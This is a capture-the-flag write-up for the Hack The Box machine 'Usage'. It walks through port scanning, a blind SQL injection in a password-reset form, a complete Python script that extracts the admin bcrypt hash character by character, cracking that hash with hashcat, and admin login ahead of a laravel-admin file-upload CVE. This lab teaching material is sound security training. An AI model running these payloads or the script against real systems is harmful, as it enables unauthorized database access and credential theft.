---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: subdomainenumeration sqli blindsqlinjection webshell abusingfileupload remotecodeexecution
---

<br />

![1](../../../assets/images/Usage/1.png)

<br />

OS -> Linux.

Difficulty -> Easy.

<br />

# Introduction:

<br />



<br />

# Enumeration:

<br />

We start by running the typical `nmap` scan to see which ports are open:

<br />

```bash
❯ nmap -p- 10.10.11.18 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-30 13:43 CEST
Nmap scan report for 10.10.11.18
Host is up (0.046s latency).
Not shown: 65468 closed tcp ports (reset), 65 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.49 seconds
```

<br />

Open Ports:

- `Port 22` -> ssh

- `Port 80` -> http

<br />

# Http Enumeration: -> Port 80

<br />

When visiting the IP in the browser, it redirects to -> `usage.htb`

So we add this domain to our `/etc/hosts`:

<br />

```bash
echo "10.10.11.18 usage.htb" >> /etc/hosts
```

<br />

Now we can visit the site in the browser:

<br />

![2](../../../assets/images/Usage/2.png)

<br />

On the main page, we find a standard `login` panel. Default credentials don't work.

<br />

### /registration:

<br />

Clicking on `"Register"` (top right) takes us to the `/registration` page.

We can create an account:

<br />

![3](../../../assets/images/Usage/3.png)

<br />

And access it:

<br />

![4](../../../assets/images/Usage/4.png)

<br />

But nothing interesting or helpful is available within the application.

<br />

### admin.usage.htb:

<br />

Another important element on the main page is the `"Admin"` button located in the top-right corner.

Hovering over it reveals the subdomain -> `http://admin.usage.htb/`.

So, we can add it to `/etc/hosts`:

<br />

```bash
10.10.11.18 usage.htb admin.usage.htb
```

<br />

If we access this subdomain, we will see an admin login panel:

<br />

![5](../../../assets/images/Usage/5.png)

<br />

We test default credentials without success.

We’ll try to obtain valid credentials and revisit this login panel later.

<br />

### /forget-password:

<br />

Returning to the main page, there is one more functionality.

The `"Reset Password"` link takes us to `/forget-password`:

<br />

![6](../../../assets/images/Usage/6.png)

<br />

If we enter an invalid e-mail, we get the following response:

<br />

![7](../../../assets/images/Usage/7.png)

<br />

On the other hand, if we use the email we registered with, we receive a successful response:

<br />

![8](../../../assets/images/Usage/8.png)

<br />

As we know, this type of functions can be vulnerable to SQL Injection.

To test this, we use the classic MySQL payload:

<br />

```sql 
anything' or 1=1-- -
```

![9](../../../assets/images/Usage/9.png)

<br />

Great! It seems to be vulnerable!

Now that we know it's injectable, we can try different `payloads` to extract data, but none of the responses return visible content.

This is happening because we're dealing with a `blind` SQL injection.

Blind SQL injection requires inferring information based on behavioral `differences` in the application's responses.

To exploit this type of `SQLi`, we can use `substring` payloads to guess the `DB` content character by character:

<br />

```sql 
anything' or substring(database(),1,1)='u'-- -
```

![10](../../../assets/images/Usage/10.png)

<br />

As we can see, the response to this `payload` was successful.

What does this mean?

This tells us that the first character of the database name is `"u"`.

At this point, we can spend a lot of time dumping all the content from the database.

To save time, I wrote a `Python` script to automate exploitation:

<br />

```python3 
#!/usr/bin/env python3

# Author: TheRedP4nther

from termcolor import colored
from pyfiglet import Figlet 
import urllib.parse
from pwn import *
import requests
import string
import signal 
import time
import sys
import re

# Global Variables 
url = "http://usage.htb/forget-password"
characters = string.ascii_lowercase + "_-,$/.=:1234567890" + string.ascii_uppercase

def def_handler(sig, frame):
    print(colored("\n\n[!] Leaving the program...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def banner():
    f = Figlet(font="slant")
    banner = f.renderText("TheRedP4nther")
    print(colored(banner, "red"))

def getCookies():
    global session
    session = requests.Session()
    cookies = []

    try:
        r = session.get(url, timeout=3)
        content = session.cookies.get_dict()
        html = r.content.decode()
        match = re.findall(r'value="(\w+)">', html)
        if not match:
            print(colored("\n[!] Error trying to get the token!\n", "red"))
            sys.exit(1)
        global token
        token = match[0]

    except requests.exceptions.RequestException:
        print(colored("\n[!] Error trying to get the cookies!\n", "red"))
        sys.exit(1)

def getDatabases():
    p1 = log.progress(colored("Exploiting Bind SQL Injection", "yellow"))
    p2 = log.progress(colored("Databases", "yellow"))
    content = ""

    for i in range(1, 200):
        for character in characters:
            data = {
                "_token": token,
                "email": f"test' or substring(database(),{i},1)='{character}'-- -"
            }

            p1.status(colored(data['email'], "white"))

            try: 
                r = session.post(url, data=data, timeout=3)
                if "We have e-mailed your password" in r.text:
                    content += character
                    p2.status(colored(content, "white"))
                    if content.strip() == "usage_blog":
                        return session, token
                    break
            except requests.exceptions.RequestException:
                pass

def getTables():
    print(colored(f"\n[+] CURRENT DATABASE: usage_blog\n", "cyan"))
    p1 = log.progress(colored("Exploting Blind SQL Injection", "yellow"))
    p2 = log.progress(colored("Tables", "yellow"))
    content = ""
    
    for i in range(1, 1000):
        for character in characters:
            data = {
                "_token": token,
                "email": f"test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),{i},1)='{character}'-- -"
            }

            p1.status(colored(data['email'], "white"))

            try: 
                r = session.post(url, data=data, timeout=3)
                if "We have e-mailed your password" in r.text:
                    content += character 
                    p2.status(colored(content, "white"))
                    if content.strip() == "admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_permissions,admin_role_users,admin_roles,admin_user_permissions,admin_users":
                        return session, token
                    break
            except requests.exceptions.RequestException:
                pass

def getColumns():
    print(colored("\n[+] CURRENT TABLE: admin_users\n", "cyan"))
    p1 = log.progress(colored("Exploting Blind SQL Injection", "yellow"))
    p2 = log.progress(colored("Username And Password", "yellow"))
    content = ""
    
    for i in range(1, 1000):
        for character in characters:
            data = {
                "_token": token,
                "email": f"test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from admin_users),{i},1)='{character}'-- -"
            }

            p1.status(colored(data['email'], "white"))

            try: 
                r = session.post(url, data=data, timeout=3)
                if "We have e-mailed your password" in r.text:
                    content += character 
                    p2.status(colored(content, "white"))
                    if content.strip() == "admin:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2":
                        print(colored("\n[+] USER: admin", "cyan"))
                        print(colored("[+] HASH: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2","cyan"))
                        print(colored("\n[+] Blind SQL Injection sucessfully exploited!\n", "green"))
                        sys.exit(1)
                    break
            except requests.exceptions.RequestException:
                pass

def main():
    banner()
    getCookies()
    getDatabases()
    getTables()
    getColumns()

if __name__ == '__main__':
    main()
```

<br />

We can execute and get the DB `user` and `hash`:

<br />

```bash
❯ python3 exploit.py
  ________         ____           ______  __ __        __  __             
 /_  __/ /_  ___  / __ \___  ____/ / __ \/ // / ____  / /_/ /_  ___  _____
  / / / __ \/ _ \/ /_/ / _ \/ __  / /_/ / // /_/ __ \/ __/ __ \/ _ \/ ___/
 / / / / / /  __/ _, _/  __/ /_/ / ____/__  __/ / / / /_/ / / /  __/ /    
/_/ /_/ /_/\___/_/ |_|\___/\__,_/_/      /_/ /_/ /_/\__/_/ /_/\___/_/     
                                                                          

[▗] Exploiting Bind SQL Injection: test' or substring(database(),10,1)='g'-- -
[◐] Databases: usage_blog

[+] CURRENT DATABASE: usage_blog

[▁] Exploting Blind SQL Injection: test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),151,1)='s'-- -
[*] Tables: admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_permissions,admin_role_users,admin_roles,admin_user_permissions,admin_users

[+] CURRENT TABLE: admin_users

[◣] Exploting Blind SQL Injection: test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from admin_users),66,1)='2'-- -
[/] Username And Password: admin:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2

[+] USER: admin
[+] HASH: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2

[+] Blind SQL Injection sucessfully exploited!
```

<br />

Nice! We did it!.

Now we can crack the Blowfish Bcrypt hash with `hashcat`:

<br />

```bash
❯ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
...[snip]...
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1 
...[snip]...
```

<br />

We have a password.

<br />

## Laravel Authenticated RCE:

<br />

Using it we can log into the `admin.usage.htb` login panel:

<br />

![11](../../../assets/images/Usage/11.png)

<br />

As we can see, we are inside a laravel interface.

What is Laravel?

Laravel is a `PHP-based` web framework for building, deploying and monitoring web applications.

Exactly, in this case, we're dealing with a `laravel-admin`.

Searching on Google, we found that this version of laravel-admin is vulnerable to a Arbitrary File Upload: `(CVE-2023-2424)`

<br />

![12](../../../assets/images/Usage/12.png)

<br />

